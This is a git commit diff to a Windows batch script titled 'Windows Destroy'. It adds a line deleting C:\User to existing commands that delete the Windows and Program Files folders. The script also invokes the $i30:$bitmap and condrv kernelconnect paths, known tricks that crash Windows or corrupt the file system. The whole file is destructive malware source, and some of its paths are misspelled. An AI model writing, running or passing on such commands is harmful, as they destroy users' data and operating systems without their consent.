02eb117f4ed3801d4a62175cab85e81d487bf27a
Nguyễn Huy Hiếu <83147867+kirigizakazutovn@users.noreply.github.com>
2022-06-24 09:16:29 +0700

    Thêm C:\User

--- index.bat
+++ index.bat
@@ -3,5 +3,6 @@ TITLE Windows Destroy
 DEL C:\Windows /y
 DEL C:\Progam Files /y
 DEL C:\Progam Files (x86) /y
+DEL C:\User /y
 START C:\:$i30:$bitmap 
 START \\\\.\\globalroot\\device\\condrv\\kernelconnect 
